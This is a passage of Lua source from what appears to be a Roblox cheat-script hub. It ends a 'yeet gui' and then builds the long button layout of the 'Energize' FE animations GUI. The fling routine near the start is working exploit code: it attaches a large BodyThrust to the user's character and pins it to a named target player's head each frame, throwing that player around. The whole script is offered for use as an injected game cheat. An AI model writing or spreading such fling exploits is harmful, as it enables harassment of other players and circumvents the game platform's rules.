		TextLabel_3.TextSize = 14
		yets.MouseButton1Click:Connect(function()
			local target = unpack(GetPlayer(AA.Text)).Character
			game:GetService'Players'.LocalPlayer.Character.Humanoid.PlatformStand = true
			yeeting = true
			local coin = Instance.new('BodyThrust', game:GetService'Players'.LocalPlayer.Character.HumanoidRootPart)
			coin.Force = Vector3.new(2590, 0, 2590)
			coin.Name = "yeetforce"
			repeat
				game:GetService'Players'.LocalPlayer.Character.HumanoidRootPart.CFrame = target.Head.CFrame;
				coin.Location = target.Head.Position
				game["Run Service"].Heartbeat:wait()
			until not target.Head or yeeting == false
		end)
		stopyets.MouseButton1Click:Connect(function()
			ypcall(function()
				game:GetService'Players'.LocalPlayer.Character.HumanoidRootPart.yeetforce:Destroy()
				game:GetService'Players'.LocalPlayer.Character.Humanoid.PlatformStand = false
			end)
			yeeting = false
		end)
		ultrayets.MouseButton1Click:Connect(function()
			local target = unpack(GetPlayer(AA.Text)).Character
			game:GetService'Players'.LocalPlayer.Character.Humanoid.PlatformStand = true
			yeeting = true
			local coin = Instance.new('BodyThrust', game:GetService'Players'.LocalPlayer.Character.HumanoidRootPart)
			coin.Force = Vector3.new(9999, 9999, 9999)
			coin.Name = "yeetforce"
			repeat
				game:GetService'Players'.LocalPlayer.Character.HumanoidRootPart.CFrame = target.Head.CFrame;
				coin.Location = target.Head.Position
				game["Run Service"].Heartbeat:wait()
			until not target.Head or yeeting == false
		end)
		while game["Run Service"].Heartbeat:wait() do
			ImageLabel.Rotation = ImageLabel.Rotation + 1
			TextLabel_3.Text = ahh('yeet gui')
		end
	end
})
GUIS:AddButton({
	Title = "Energize FE GUI",
	Description = "Animations",
	Callback = function()
			-- Energize by illremember, fe animations
-- DO NOT COPY AND CLAIM AS OWN, if you are using some of the script for your own, credit is highly appreciated!
-- Thank you, and enjoy.

-- Objects
		local Energize = Instance.new("ScreenGui") -- The actual GUI
		local SideFrame = Instance.new("Frame") -- Visible when GUI is closed
		local OpenGUI = Instance.new("TextButton") -- Part of SideFrame
		local SideFrameTitle = Instance.new("TextLabel") -- Part of SideFrame
		local MainFrame = Instance.new("Frame") -- All of the stuff on the main frame
		local GuiBottomFrame = Instance.new("Frame") -- Part of Active Frame
		local Credits = Instance.new("TextLabel") -- Credits to illremember, hello there
		local ScrollingFrame = Instance.new("ScrollingFrame") -- The scrolling frame of animations
		local CheckR = Instance.new("TextLabel") -- Check if R15 or R6
		local ScrollingFrameR15 = Instance.new("ScrollingFrame") -- The scrolling frame of R15 animations
		local CrazySlash = Instance.new("TextButton")--COMPLETE
		local Open = Instance.new("TextButton")--COMPLETE
		local R15Spinner = Instance.new("TextButton")--COMPLETE
		local ArmsOut = Instance.new("TextButton")--COMPLETE
		local FloatSlash = Instance.new("TextButton")--COMPLETE
		local WeirdZombie = Instance.new("TextButton")--COMPLETE
		local DownSlash = Instance.new("TextButton")--COMPLETE
		local Pull = Instance.new("TextButton")--COMPLETE
		local CircleArm = Instance.new("TextButton")--COMPLETE
		local Bend = Instance.new("TextButton")--COMPLETE
		local RotateSlash = Instance.new("TextButton")--COMPLETE
		local FlingArms = Instance.new("TextButton")--COMPLETE
		local FullSwing = Instance.new("TextButton")--COMPLETE
		local GlitchLevitate = Instance.new("TextButton")--COMPLETE
		local MoonDance = Instance.new("TextButton")--COMPLETE
		local FullPunch = Instance.new("TextButton")--COMPLETE
		local Crouch = Instance.new("TextButton")--COMPLETE
		local SpinDance = Instance.new("TextButton")--COMPLETE
		local FloorFaint = Instance.new("TextButton")--COMPLETE
		local JumpingJacks = Instance.new("TextButton")--COMPLETE
		local Spinner = Instance.new("TextButton")--COMPLETE
		local MegaInsane = Instance.new("TextButton")--COMPLETE
		local ArmDetach = Instance.new("TextButton")--COMPLETE
		local WeirdMove = Instance.new("TextButton")--COMPLETE
		local Faint = Instance.new("TextButton")--COMPLETE
		local CloneIllusion = Instance.new("TextButton")--COMPLETE
		local Levitate = Instance.new("TextButton")--COMPLETE
		local DinoWalk = Instance.new("TextButton")--COMPLETE
		local FloorCrawl = Instance.new("TextButton")--COMPLETE
		local SwordSlam = Instance.new("TextButton")--COMPLETE
		local LoopHead = Instance.new("TextButton")--COMPLETE
		local HeroJump = Instance.new("TextButton")--COMPLETE
		local Insane = Instance.new("TextButton")--COMPLETE
		local FloatingHead = Instance.new("TextButton")--COMPLETE
		local HeadThrow = Instance.new("TextButton")--COMPLETE
		local MovingDance = Instance.new("TextButton")--COMPLETE
		local SuperPunch = Instance.new("TextButton")--COMPLETE
		local ArmTurbine = Instance.new("TextButton")--COMPLETE
		local Dab = Instance.new("TextButton")--COMPLETE
		local FloatSit = Instance.new("TextButton")--COMPLETE
		local SuperFaint = Instance.new("TextButton")--COMPLETE
		local BarrelRoll = Instance.new("TextButton")--COMPLETE
		local Scared = Instance.new("TextButton")--COMPLETE
		local InsaneArms = Instance.new("TextButton")--COMPLETE
		local SwordSlice = Instance.new("TextButton")--COMPLETE
		local SpinDance2 = Instance.new("TextButton")--COMPLETE
		local BowDown = Instance.new("TextButton")--COMPLETE
		local LoopSlam = Instance.new("TextButton")--COMPLETE
		local GuiTopFrame = Instance.new("Frame") -- Top of the main frame
		local CloseGUI = Instance.new("TextButton") -- To close the GUI
		local Title = Instance.new("TextLabel") -- Actual title of GUI, Energize

-- Properties
		Energize.Name = "Energize"
		Energize.Parent = game:GetService("Players").LocalPlayer.PlayerGui
		SideFrame.Name = "SideFrame"
		SideFrame.Parent = Energize
		SideFrame.Active = true
		SideFrame.BackgroundColor3 = Color3.new(1, 0.329412, 0.329412)
		SideFrame.Draggable = true
		SideFrame.Position = UDim2.new(0, 376, 0, 125)
		SideFrame.Size = UDim2.new(0, 460, 0, 32)
		SideFrame.Visible = false
		OpenGUI.Name = "OpenGUI"
		OpenGUI.Parent = SideFrame
		OpenGUI.BackgroundColor3 = Color3.new(1, 1, 1)
		OpenGUI.BackgroundTransparency = 1
		OpenGUI.Position = UDim2.new(0, 426, 0, 0)
		OpenGUI.Size = UDim2.new(0, 34, 0, 32)
		OpenGUI.Font = Enum.Font.SourceSans
		OpenGUI.FontSize = Enum.FontSize.Size48
		OpenGUI.Text = "X"
		OpenGUI.TextColor3 = Color3.new(0.333333, 0, 0)
		OpenGUI.TextSize = 40
		OpenGUI.TextWrapped = true
		SideFrameTitle.Name = "SideFrameTitle"
		SideFrameTitle.Parent = SideFrame
		SideFrameTitle.BackgroundColor3 = Color3.new(1, 1, 1)
		SideFrameTitle.BackgroundTransparency = 1
		SideFrameTitle.Position = UDim2.new(0, 170, 0, 0)
		SideFrameTitle.Size = UDim2.new(0, 119, 0, 31)
		SideFrameTitle.Font = Enum.Font.Arial
		SideFrameTitle.FontSize = Enum.FontSize.Size24
		SideFrameTitle.Text = "-Energize-"
		SideFrameTitle.TextSize = 21
		SideFrameTitle.TextStrokeColor3 = Color3.new(0.27451, 0.92549, 0.905882)
		SideFrameTitle.TextStrokeTransparency = 0.69999998807907
		MainFrame.Name = "MainFrame"
		MainFrame.Parent = Energize
		MainFrame.Active = true
		MainFrame.BackgroundColor3 = Color3.new(1, 1, 1)
		MainFrame.BackgroundTransparency = 1
		MainFrame.Draggable = true
		MainFrame.Position = UDim2.new(0, 376, 0, 125)
		MainFrame.Size = UDim2.new(0, 444, 0, 280)
		GuiBottomFrame.Name = "Gui BottomFrame"
		GuiBottomFrame.Parent = MainFrame
		GuiBottomFrame.BackgroundColor3 = Color3.new(1, 0.329412, 0.329412)
		GuiBottomFrame.BorderColor3 = Color3.new(0.243137, 0.243137, 0.243137)
		GuiBottomFrame.Position = UDim2.new(0, 0, 0, 247)
		GuiBottomFrame.Size = UDim2.new(0, 460, 0, 32)
		Credits.Name = "Credits"
		Credits.Parent = GuiBottomFrame
		Credits.BackgroundColor3 = Color3.new(1, 1, 1)
		Credits.BackgroundTransparency = 1
		Credits.Size = UDim2.new(0, 460, 0, 32)
		Credits.FontSize = Enum.FontSize.Size14
		Credits.Text = "By illremember -FE Animations Gui"
		Credits.TextColor3 = Color3.new(0.219608, 0.219608, 0.219608)
		Credits.TextSize = 14
		Credits.TextStrokeColor3 = Color3.new(0.141176, 0.870588, 0.713726)
		Credits.TextStrokeTransparency = 0.69999998807907
		Credits.TextWrapped = true
		ScrollingFrame.Parent = MainFrame
		ScrollingFrame.BackgroundColor3 = Color3.new(1, 0.564706, 0.564706)
		ScrollingFrame.Position = UDim2.new(0, 0, 0, 32)
		ScrollingFrame.Size = UDim2.new(0, 460, 0, 215)
		ScrollingFrame.ScrollBarThickness = 13
		FullSwing.Name = "FullSwing"
		FullSwing.Parent = ScrollingFrame
		FullSwing.BackgroundColor3 = Color3.new(0.886275, 0.776471, 0.368627)
		FullSwing.BorderColor3 = Color3.new(0.313726, 0.313726, 0.313726)
		FullSwing.Position = UDim2.new(0, 17, 0, 322)
		FullSwing.Size = UDim2.new(0, 119, 0, 34)
		FullSwing.Font = Enum.Font.Highway
		FullSwing.FontSize = Enum.FontSize.Size24
		FullSwing.Text = "Full Swing"
		FullSwing.TextSize = 20
		FullSwing.TextWrapped = true
		GlitchLevitate.Name = "GlitchLevitate"
		GlitchLevitate.Parent = ScrollingFrame
		GlitchLevitate.BackgroundColor3 = Color3.new(0.886275, 0.776471, 0.368627)
		GlitchLevitate.BorderColor3 = Color3.new(0.313726, 0.313726, 0.313726)
		GlitchLevitate.Position = UDim2.new(0, 319, 0, 322)
		GlitchLevitate.Size = UDim2.new(0, 119, 0, 34)
		GlitchLevitate.Font = Enum.Font.Highway
		GlitchLevitate.FontSize = Enum.FontSize.Size24
		GlitchLevitate.Text = "Glitch Levitate"
		GlitchLevitate.TextSize = 20
		GlitchLevitate.TextWrapped = true
		MoonDance.Name = "MoonDance"
		MoonDance.Parent = ScrollingFrame
		MoonDance.BackgroundColor3 = Color3.new(0.886275, 0.776471, 0.368627)
		MoonDance.BorderColor3 = Color3.new(0.313726, 0.313726, 0.313726)
		MoonDance.Position = UDim2.new(0, 319, 0, 280)
		MoonDance.Size = UDim2.new(0, 119, 0, 34)
		MoonDance.Font = Enum.Font.Highway
		MoonDance.FontSize = Enum.FontSize.Size24
		MoonDance.Text = "Moon Dance"
		MoonDance.TextSize = 20
		MoonDance.TextWrapped = true
		FullPunch.Name = "FullPunch"
		FullPunch.Parent = ScrollingFrame
		FullPunch.BackgroundColor3 = Color3.new(0.886275, 0.776471, 0.368627)
		FullPunch.BorderColor3 = Color3.new(0.313726, 0.313726, 0.313726)
		FullPunch.Position = UDim2.new(0, 17, 0, 280)
		FullPunch.Size = UDim2.new(0, 119, 0, 34)
		FullPunch.Font = Enum.Font.Highway
		FullPunch.FontSize = Enum.FontSize.Size24
		FullPunch.Text = "Full Punch"
		FullPunch.TextSize = 20
		FullPunch.TextWrapped = true
		Crouch.Name = "Crouch"
		Crouch.Parent = ScrollingFrame
		Crouch.BackgroundColor3 = Color3.new(0.886275, 0.776471, 0.368627)
		Crouch.BorderColor3 = Color3.new(0.313726, 0.313726, 0.313726)
		Crouch.Position = UDim2.new(0, 168, 0, 280)
		Crouch.Size = UDim2.new(0, 119, 0, 34)
		Crouch.Font = Enum.Font.Highway
		Crouch.FontSize = Enum.FontSize.Size24
		Crouch.Text = "Crouch"
		Crouch.TextSize = 20
		Crouch.TextWrapped = true
		SpinDance.Name = "SpinDance"
		SpinDance.Parent = ScrollingFrame
		SpinDance.BackgroundColor3 = Color3.new(0.886275, 0.776471, 0.368627)
		SpinDance.BorderColor3 = Color3.new(0.313726, 0.313726, 0.313726)
		SpinDance.Position = UDim2.new(0, 168, 0, 236)
		SpinDance.Size = UDim2.new(0, 119, 0, 34)
		SpinDance.Font = Enum.Font.Highway
		SpinDance.FontSize = Enum.FontSize.Size24
		SpinDance.Text = "Spin Dance"
		SpinDance.TextSize = 20
		SpinDance.TextWrapped = true
		FloorFaint.Name = "FloorFaint"
		FloorFaint.Parent = ScrollingFrame
		FloorFaint.BackgroundColor3 = Color3.new(0.886275, 0.776471, 0.368627)
		FloorFaint.BorderColor3 = Color3.new(0.313726, 0.313726, 0.313726)
		FloorFaint.Position = UDim2.new(0, 17, 0, 236)
		FloorFaint.Size = UDim2.new(0, 119, 0, 34)
		FloorFaint.Font = Enum.Font.Highway
		FloorFaint.FontSize = Enum.FontSize.Size24
		FloorFaint.Text = "Floor Faint"
		FloorFaint.TextSize = 20
		FloorFaint.TextWrapped = true
		JumpingJacks.Name = "JumpingJacks"
		JumpingJacks.Parent = ScrollingFrame
		JumpingJacks.BackgroundColor3 = Color3.new(0.886275, 0.776471, 0.368627)
		JumpingJacks.BorderColor3 = Color3.new(0.313726, 0.313726, 0.313726)
		JumpingJacks.Position = UDim2.new(0, 319, 0, 236)
		JumpingJacks.Size = UDim2.new(0, 119, 0, 34)
		JumpingJacks.Font = Enum.Font.Highway
		JumpingJacks.FontSize = Enum.FontSize.Size24
		JumpingJacks.Text = "Jumping Jacks"
		JumpingJacks.TextSize = 20
		JumpingJacks.TextWrapped = true
		Spinner.Name = "Spinner"
		Spinner.Parent = ScrollingFrame
		Spinner.BackgroundColor3 = Color3.new(0.886275, 0.776471, 0.368627)
		Spinner.BorderColor3 = Color3.new(0.313726, 0.313726, 0.313726)
		Spinner.Position = UDim2.new(0, 17, 0, 192)
		Spinner.Size = UDim2.new(0, 119, 0, 34)
		Spinner.Font = Enum.Font.Highway
		Spinner.FontSize = Enum.FontSize.Size24
		Spinner.Text = "Spinner"
		Spinner.TextSize = 20
		Spinner.TextWrapped = true
		MegaInsane.Name = "MegaInsane"
		MegaInsane.Parent = ScrollingFrame
		MegaInsane.BackgroundColor3 = Color3.new(0.886275, 0.776471, 0.368627)
		MegaInsane.BorderColor3 = Color3.new(0.313726, 0.313726, 0.313726)
		MegaInsane.Position = UDim2.new(0, 168, 0, 192)
		MegaInsane.Size = UDim2.new(0, 119, 0, 34)
		MegaInsane.Font = Enum.Font.Highway
		MegaInsane.FontSize = Enum.FontSize.Size24
		MegaInsane.Text = "Mega Insane"
		MegaInsane.TextSize = 20
		MegaInsane.TextWrapped = true
		ArmDetach.Name = "ArmDetach"
		ArmDetach.Parent = ScrollingFrame
		ArmDetach.BackgroundColor3 = Color3.new(0.886275, 0.776471, 0.368627)
		ArmDetach.BorderColor3 = Color3.new(0.313726, 0.313726, 0.313726)
		ArmDetach.Position = UDim2.new(0, 319, 0, 192)
		ArmDetach.Size = UDim2.new(0, 119, 0, 34)
		ArmDetach.Font = Enum.Font.Highway
		ArmDetach.FontSize = Enum.FontSize.Size24
		ArmDetach.Text = "Arm Detach"
		ArmDetach.TextSize = 20
		ArmDetach.TextWrapped = true
		WeirdMove.Name = "WeirdMove"
		WeirdMove.Parent = ScrollingFrame
		WeirdMove.BackgroundColor3 = Color3.new(0.886275, 0.776471, 0.368627)
		WeirdMove.BorderColor3 = Color3.new(0.313726, 0.313726, 0.313726)
		WeirdMove.Position = UDim2.new(0, 168, 0, 148)
		WeirdMove.Size = UDim2.new(0, 119, 0, 34)
		WeirdMove.Font = Enum.Font.Highway
		WeirdMove.FontSize = Enum.FontSize.Size24
		WeirdMove.Text = "Weird Move"
		WeirdMove.TextSize = 20
		WeirdMove.TextWrapped = true
		Faint.Name = "Faint"
		Faint.Parent = ScrollingFrame
		Faint.BackgroundColor3 = Color3.new(0.886275, 0.776471, 0.368627)
		Faint.BorderColor3 = Color3.new(0.313726, 0.313726, 0.313726)
		Faint.Position = UDim2.new(0, 17, 0, 148)
		Faint.Size = UDim2.new(0, 119, 0, 34)
		Faint.Font = Enum.Font.Highway
		Faint.FontSize = Enum.FontSize.Size24
		Faint.Text = "Faint"
		Faint.TextSize = 20
		Faint.TextWrapped = true
		CloneIllusion.Name = "CloneIllusion"
		CloneIllusion.Parent = ScrollingFrame
		CloneIllusion.BackgroundColor3 = Color3.new(0.886275, 0.776471, 0.368627)
		CloneIllusion.BorderColor3 = Color3.new(0.313726, 0.313726, 0.313726)
		CloneIllusion.Position = UDim2.new(0, 319, 0, 148)
		CloneIllusion.Size = UDim2.new(0, 119, 0, 34)
		CloneIllusion.Font = Enum.Font.Highway
		CloneIllusion.FontSize = Enum.FontSize.Size24
		CloneIllusion.Text = "Clone Illusion"
		CloneIllusion.TextSize = 20
		CloneIllusion.TextWrapped = true
		Levitate.Name = "Levitate"
		Levitate.Parent = ScrollingFrame
		Levitate.BackgroundColor3 = Color3.new(0.886275, 0.776471, 0.368627)
		Levitate.BorderColor3 = Color3.new(0.313726, 0.313726, 0.313726)
		Levitate.Position = UDim2.new(0, 17, 0, 104)
		Levitate.Size = UDim2.new(0, 119, 0, 34)
		Levitate.Font = Enum.Font.Highway
		Levitate.FontSize = Enum.FontSize.Size24
		Levitate.Text = "Levitate"
		Levitate.TextSize = 20
		Levitate.TextWrapped = true
		DinoWalk.Name = "DinoWalk"
		DinoWalk.Parent = ScrollingFrame
		DinoWalk.BackgroundColor3 = Color3.new(0.886275, 0.776471, 0.368627)
		DinoWalk.BorderColor3 = Color3.new(0.313726, 0.313726, 0.313726)
		DinoWalk.Position = UDim2.new(0, 168, 0, 104)
		DinoWalk.Size = UDim2.new(0, 119, 0, 34)
		DinoWalk.Font = Enum.Font.Highway
		DinoWalk.FontSize = Enum.FontSize.Size24
		DinoWalk.Text = "Dino Walk"
		DinoWalk.TextSize = 20
		DinoWalk.TextWrapped = true
		FloorCrawl.Name = "FloorCrawl"
		FloorCrawl.Parent = ScrollingFrame
		FloorCrawl.BackgroundColor3 = Color3.new(0.886275, 0.776471, 0.368627)
		FloorCrawl.BorderColor3 = Color3.new(0.313726, 0.313726, 0.313726)
		FloorCrawl.Position = UDim2.new(0, 319, 0, 104)
		FloorCrawl.Size = UDim2.new(0, 119, 0, 34)
		FloorCrawl.Font = Enum.Font.Highway
		FloorCrawl.FontSize = Enum.FontSize.Size24
		FloorCrawl.Text = "Floor Crawl"
		FloorCrawl.TextSize = 20
		FloorCrawl.TextWrapped = true
		SwordSlam.Name = "SwordSlam"
		SwordSlam.Parent = ScrollingFrame
		SwordSlam.BackgroundColor3 = Color3.new(0.886275, 0.776471, 0.368627)
		SwordSlam.BorderColor3 = Color3.new(0.313726, 0.313726, 0.313726)
		SwordSlam.Position = UDim2.new(0, 319, 0, 60)
		SwordSlam.Size = UDim2.new(0, 119, 0, 34)
		SwordSlam.Font = Enum.Font.Highway
		SwordSlam.FontSize = Enum.FontSize.Size24
		SwordSlam.Text = "Sword Slam"
		SwordSlam.TextSize = 20
		SwordSlam.TextWrapped = true
		LoopHead.Name = "LoopHead"
		LoopHead.Parent = ScrollingFrame
		LoopHead.BackgroundColor3 = Color3.new(0.886275, 0.776471, 0.368627)
		LoopHead.BorderColor3 = Color3.new(0.313726, 0.313726, 0.313726)
		LoopHead.Position = UDim2.new(0, 168, 0, 60)
		LoopHead.Size = UDim2.new(0, 119, 0, 34)
		LoopHead.Font = Enum.Font.Highway
		LoopHead.FontSize = Enum.FontSize.Size24
		LoopHead.Text = "Loop Head"
		LoopHead.TextSize = 20
		LoopHead.TextWrapped = true
		HeroJump.Name = "HeroJump"
		HeroJump.Parent = ScrollingFrame
		HeroJump.BackgroundColor3 = Color3.new(0.886275, 0.776471, 0.368627)
		HeroJump.BorderColor3 = Color3.new(0.313726, 0.313726, 0.313726)
		HeroJump.Position = UDim2.new(0, 17, 0, 60)
		HeroJump.Size = UDim2.new(0, 119, 0, 34)
		HeroJump.Font = Enum.Font.Highway
		HeroJump.FontSize = Enum.FontSize.Size24
		HeroJump.Text = "Hero Jump"
		HeroJump.TextSize = 20
		HeroJump.TextWrapped = true
		Insane.Name = "Insane"
		Insane.Parent = ScrollingFrame
		Insane.BackgroundColor3 = Color3.new(0.886275, 0.776471, 0.368627)
		Insane.BorderColor3 = Color3.new(0.313726, 0.313726, 0.313726)
		Insane.Position = UDim2.new(0, 319, 0, 16)
		Insane.Size = UDim2.new(0, 119, 0, 34)
		Insane.Font = Enum.Font.Highway
		Insane.FontSize = Enum.FontSize.Size24
		Insane.Text = "Insane"
		Insane.TextSize = 20
		Insane.TextWrapped = true
		FloatingHead.Name = "FloatingHead"
		FloatingHead.Parent = ScrollingFrame
		FloatingHead.BackgroundColor3 = Color3.new(0.886275, 0.776471, 0.368627)
		FloatingHead.BorderColor3 = Color3.new(0.313726, 0.313726, 0.313726)
		FloatingHead.Position = UDim2.new(0, 168, 0, 16)
		FloatingHead.Size = UDim2.new(0, 119, 0, 34)
		FloatingHead.Font = Enum.Font.Highway
		FloatingHead.FontSize = Enum.FontSize.Size24
		FloatingHead.Text = "Floating Head"
		FloatingHead.TextSize = 20
		FloatingHead.TextWrapped = true
		HeadThrow.Name = "HeadThrow"
		HeadThrow.Parent = ScrollingFrame
		HeadThrow.BackgroundColor3 = Color3.new(0.886275, 0.776471, 0.368627)
		HeadThrow.BorderColor3 = Color3.new(0.313726, 0.313726, 0.313726)
		HeadThrow.Position = UDim2.new(0, 17, 0, 16)
		HeadThrow.Size = UDim2.new(0, 119, 0, 34)
		HeadThrow.Font = Enum.Font.Highway
		HeadThrow.FontSize = Enum.FontSize.Size24
		HeadThrow.Text = "Head Throw"
		HeadThrow.TextSize = 20
		HeadThrow.TextWrapped = true
		MovingDance.Name = "MovingDance"
		MovingDance.Parent = ScrollingFrame
		MovingDance.BackgroundColor3 = Color3.new(0.886275, 0.776471, 0.368627)
		MovingDance.BorderColor3 = Color3.new(0.313726, 0.313726, 0.313726)
		MovingDance.Position = UDim2.new(0, 168, 0, 324)
		MovingDance.Size = UDim2.new(0, 119, 0, 34)
		MovingDance.Font = Enum.Font.Highway
		MovingDance.FontSize = Enum.FontSize.Size24
		MovingDance.Text = "Moving Dance"
		MovingDance.TextSize = 20
		MovingDance.TextWrapped = true
		SuperPunch.Name = "SuperPunch"
		SuperPunch.Parent = ScrollingFrame
		SuperPunch.BackgroundColor3 = Color3.new(0.886275, 0.776471, 0.368627)
		SuperPunch.BorderColor3 = Color3.new(0.313726, 0.313726, 0.313726)
		SuperPunch.Position = UDim2.new(0, 168, 0, 366)
		SuperPunch.Size = UDim2.new(0, 119, 0, 34)
		SuperPunch.Font = Enum.Font.Highway
		SuperPunch.FontSize = Enum.FontSize.Size24
		SuperPunch.Text = "Super Punch"
		SuperPunch.TextSize = 20
		SuperPunch.TextWrapped = true
		ArmTurbine.Name = "ArmTurbine"
		ArmTurbine.Parent = ScrollingFrame
		ArmTurbine.BackgroundColor3 = Color3.new(0.886275, 0.776471, 0.368627)
		ArmTurbine.BorderColor3 = Color3.new(0.313726, 0.313726, 0.313726)
		ArmTurbine.Position = UDim2.new(0, 319, 0, 366)
		ArmTurbine.Size = UDim2.new(0, 119, 0, 34)
		ArmTurbine.Font = Enum.Font.Highway
		ArmTurbine.FontSize = Enum.FontSize.Size24
		ArmTurbine.Text = "Arm Turbine"
		ArmTurbine.TextSize = 20
		ArmTurbine.TextWrapped = true
		Dab.Name = "Dab"
		Dab.Parent = ScrollingFrame
		Dab.BackgroundColor3 = Color3.new(0.886275, 0.776471, 0.368627)
		Dab.BorderColor3 = Color3.new(0.313726, 0.313726, 0.313726)
		Dab.Position = UDim2.new(0, 17, 0, 366)
		Dab.Size = UDim2.new(0, 119, 0, 34)
		Dab.Font = Enum.Font.Highway
		Dab.FontSize = Enum.FontSize.Size24
		Dab.Text = "Dab"
		Dab.TextSize = 20
		Dab.TextWrapped = true
		FloatSit.Name = "FloatSit"
		FloatSit.Parent = ScrollingFrame
		FloatSit.BackgroundColor3 = Color3.new(0.886275, 0.776471, 0.368627)
		FloatSit.BorderColor3 = Color3.new(0.313726, 0.313726, 0.313726)
		FloatSit.Position = UDim2.new(0, 168, 0, 410)
		FloatSit.Size = UDim2.new(0, 119, 0, 34)
		FloatSit.Font = Enum.Font.Highway
		FloatSit.FontSize = Enum.FontSize.Size24
		FloatSit.Text = "Float Sit"
		FloatSit.TextSize = 20
		FloatSit.TextWrapped = true
		SuperFaint.Name = "SuperFaint"
		SuperFaint.Parent = ScrollingFrame
		SuperFaint.BackgroundColor3 = Color3.new(0.886275, 0.776471, 0.368627)
		SuperFaint.BorderColor3 = Color3.new(0.313726, 0.313726, 0.313726)
		SuperFaint.Position = UDim2.new(0, 17, 0, 498)
		SuperFaint.Size = UDim2.new(0, 119, 0, 34)
		SuperFaint.Font = Enum.Font.Highway
		SuperFaint.FontSize = Enum.FontSize.Size24
		SuperFaint.Text = "Super Faint"
		SuperFaint.TextSize = 20
		SuperFaint.TextWrapped = true
		BarrelRoll.Name = "BarrelRoll"
		BarrelRoll.Parent = ScrollingFrame
		BarrelRoll.BackgroundColor3 = Color3.new(0.886275, 0.776471, 0.368627)
		BarrelRoll.BorderColor3 = Color3.new(0.313726, 0.313726, 0.313726)
		BarrelRoll.Position = UDim2.new(0, 319, 0, 410)
		BarrelRoll.Size = UDim2.new(0, 119, 0, 34)
		BarrelRoll.Font = Enum.Font.Highway
		BarrelRoll.FontSize = Enum.FontSize.Size24
		BarrelRoll.Text = "Barrel Roll"
		BarrelRoll.TextSize = 20
		BarrelRoll.TextWrapped = true
		Scared.Name = "Scared"
		Scared.Parent = ScrollingFrame
		Scared.BackgroundColor3 = Color3.new(0.886275, 0.776471, 0.368627)
		Scared.BorderColor3 = Color3.new(0.313726, 0.313726, 0.313726)
		Scared.Position = UDim2.new(0, 319, 0, 454)
		Scared.Size = UDim2.new(0, 119, 0, 34)
		Scared.Font = Enum.Font.Highway
		Scared.FontSize = Enum.FontSize.Size24
		Scared.Text = "Scared"
		Scared.TextSize = 20
		Scared.TextWrapped = true
		InsaneArms.Name = "InsaneArms"
		InsaneArms.Parent = ScrollingFrame
		InsaneArms.BackgroundColor3 = Color3.new(0.886275, 0.776471, 0.368627)
		InsaneArms.BorderColor3 = Color3.new(0.313726, 0.313726, 0.313726)
		InsaneArms.Position = UDim2.new(0, 17, 0, 454)
		InsaneArms.Size = UDim2.new(0, 119, 0, 34)
		InsaneArms.Font = Enum.Font.Highway
		InsaneArms.FontSize = Enum.FontSize.Size24
		InsaneArms.Text = "Insane Arms"
		InsaneArms.TextSize = 20
		InsaneArms.TextWrapped = true
		SwordSlice.Name = "SwordSlice"
		SwordSlice.Parent = ScrollingFrame
		SwordSlice.BackgroundColor3 = Color3.new(0.886275, 0.776471, 0.368627)
		SwordSlice.BorderColor3 = Color3.new(0.313726, 0.313726, 0.313726)
		SwordSlice.Position = UDim2.new(0, 168, 0, 454)
		SwordSlice.Size = UDim2.new(0, 119, 0, 34)
		SwordSlice.Font = Enum.Font.Highway
		SwordSlice.FontSize = Enum.FontSize.Size24
		SwordSlice.Text = "Sword Slice"
		SwordSlice.TextSize = 20
		SwordSlice.TextWrapped = true
		SpinDance2.Name = "SpinDance2"
		SpinDance2.Parent = ScrollingFrame
		SpinDance2.BackgroundColor3 = Color3.new(0.886275, 0.776471, 0.368627)
		SpinDance2.BorderColor3 = Color3.new(0.313726, 0.313726, 0.313726)
		SpinDance2.Position = UDim2.new(0, 168, 0, 498)
		SpinDance2.Size = UDim2.new(0, 119, 0, 34)
		SpinDance2.Font = Enum.Font.Highway
		SpinDance2.FontSize = Enum.FontSize.Size24
		SpinDance2.Text = "Spin Dance 2"
		SpinDance2.TextSize = 20
		SpinDance2.TextWrapped = true
		BowDown.Name = "BowDown"
		BowDown.Parent = ScrollingFrame
		BowDown.BackgroundColor3 = Color3.new(0.886275, 0.776471, 0.368627)
		BowDown.BorderColor3 = Color3.new(0.313726, 0.313726, 0.313726)
		BowDown.Position = UDim2.new(0, 319, 0, 498)
		BowDown.Size = UDim2.new(0, 119, 0, 34)
		BowDown.Font = Enum.Font.Highway
		BowDown.FontSize = Enum.FontSize.Size24
		BowDown.Text = "Bow Down"
		BowDown.TextSize = 20
		BowDown.TextWrapped = true
		LoopSlam.Name = "LoopSlam"
		LoopSlam.Parent = ScrollingFrame
		LoopSlam.BackgroundColor3 = Color3.new(0.886275, 0.776471, 0.368627)
		LoopSlam.BorderColor3 = Color3.new(0.313726, 0.313726, 0.313726)
		LoopSlam.Position = UDim2.new(0, 17, 0, 410)
		LoopSlam.Size = UDim2.new(0, 119, 0, 34)
		LoopSlam.Font = Enum.Font.Highway
		LoopSlam.FontSize = Enum.FontSize.Size24
		LoopSlam.Text = "Loop Slam"
		LoopSlam.TextSize = 20
		LoopSlam.TextWrapped = true
		GuiTopFrame.Name = "Gui TopFrame"
		GuiTopFrame.Parent = MainFrame
		GuiTopFrame.BackgroundColor3 = Color3.new(1, 0.329412, 0.329412)
		GuiTopFrame.BorderColor3 = Color3.new(0.243137, 0.243137, 0.243137)
		GuiTopFrame.Size = UDim2.new(0, 460, 0, 32)
		CloseGUI.Name = "CloseGUI"
		CloseGUI.Parent = GuiTopFrame
		CloseGUI.BackgroundColor3 = Color3.new(1, 1, 1)
		CloseGUI.BackgroundTransparency = 1
		CloseGUI.Position = UDim2.new(0, 426, 0, 0)
		CloseGUI.Size = UDim2.new(0, 34, 0, 32)
		CloseGUI.Font = Enum.Font.SourceSans
		CloseGUI.FontSize = Enum.FontSize.Size48
		CloseGUI.Text = "X"
		CloseGUI.TextColor3 = Color3.new(0.333333, 0, 0)
		CloseGUI.TextSize = 40
		CloseGUI.TextWrapped = true
		Title.Name = "Title"
		Title.Parent = GuiTopFrame
		Title.BackgroundColor3 = Color3.new(1, 1, 1)
		Title.BackgroundTransparency = 1
		Title.Size = UDim2.new(0, 460, 0, 32)
		Title.FontSize = Enum.FontSize.Size14
		Title.Text = "-Energize-"
		Title.TextColor3 = Color3.new(0.164706, 0.164706, 0.164706)
		Title.TextSize = 14
		Title.TextStrokeColor3 = Color3.new(0.384314, 0.917647, 1)
		Title.TextStrokeTransparency = 0.69999998807907
		Title.TextWrapped = true
		CheckR.Name = "CheckR"
		CheckR.Parent = GuiTopFrame
